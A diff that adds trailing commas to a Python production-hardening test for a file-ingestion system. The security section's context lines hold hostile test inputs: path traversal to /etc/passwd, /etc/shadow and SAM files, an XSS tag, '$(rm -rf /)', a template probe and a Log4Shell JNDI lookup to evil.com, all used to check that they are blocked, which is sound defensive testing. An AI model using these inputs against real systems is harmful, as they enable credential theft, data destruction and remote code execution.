@@ -56,7 +56,7 @@ async def test_production_hardening():
                 "empty_file": False,
                 "large_file": False,
                 "special_characters": False,
-                "concurrent_access": False
+                "concurrent_access": False,
             }
 
             try:
@@ -218,7 +218,7 @@ async def test_production_hardening():
                     performance_tests["ingestion_throughput"] = {
                         "files_per_second": throughput,
                         "elapsed_time": elapsed,
-                        "passed": throughput >= 1.0  # Should handle at least 1 file/sec
+                        "passed": throughput >= 1.0,  # Should handle at least 1 file/sec
                     }
 
                     self.log_info(f"    ✓ Ingested {len(test_files)} files in {elapsed:.2f}s ({throughput:.1f} files/sec)")
@@ -249,7 +249,7 @@ async def test_production_hardening():
                     performance_tests["retrieval_latency"] = {
                         "average_latency": avg_latency,
                         "max_latency": max_latency,
-                        "passed": avg_latency <= 2.0  # Should respond within 2 seconds
+                        "passed": avg_latency <= 2.0,  # Should respond within 2 seconds
                     }
 
                     self.log_info(f"    ✓ Average retrieval latency: {avg_latency:.3f}s (max: {max_latency:.3f}s)")
@@ -280,7 +280,7 @@ async def test_production_hardening():
                         "baseline_mb": baseline_memory,
                         "peak_mb": peak_memory,
                         "increase_mb": memory_increase,
-                        "passed": memory_increase < 100  # Should not increase by more than 100MB
+                        "passed": memory_increase < 100,  # Should not increase by more than 100MB
                     }
 
                     self.log_info(f"    ✓ Memory increase: {memory_increase:.1f} MB")
@@ -304,7 +304,7 @@ async def test_production_hardening():
                 "path_traversal": False,
                 "injection_attempts": False,
                 "file_type_validation": False,
-                "size_limits": False
+                "size_limits": False,
             }
 
             try:
@@ -319,7 +319,7 @@ async def test_production_hardening():
                         Path("../../../etc/passwd"),
                         Path("..\\..\\windows\\system32\\config\\sam"),
                         Path("/etc/shadow"),
-                        Path("C:\\Windows\\System32\\config\\SAM")
+                        Path("C:\\Windows\\System32\\config\\SAM"),
                     ]
 
                     blocked = 0
@@ -349,7 +349,7 @@ async def test_production_hardening():
                         "<script>alert('xss')</script>",
                         "$(rm -rf /)",
                         "{{7*7}}",
-                        "${jndi:ldap://evil.com/a}"
+                        "${jndi:ldap://evil.com/a}",
                     ]
 
                     blocked = 0
@@ -441,11 +441,11 @@ async def test_production_hardening():
                     "passed_tests": 0,
                     "failed_tests": 0,
                     "warnings": len(self.warnings),
-                    "errors": len(self.errors)
+                    "errors": len(self.errors),
                 },
                 "results": self.test_results,
                 "warnings": self.warnings,
-                "errors": self.errors
+                "errors": self.errors,
             }
 
             # Count tests
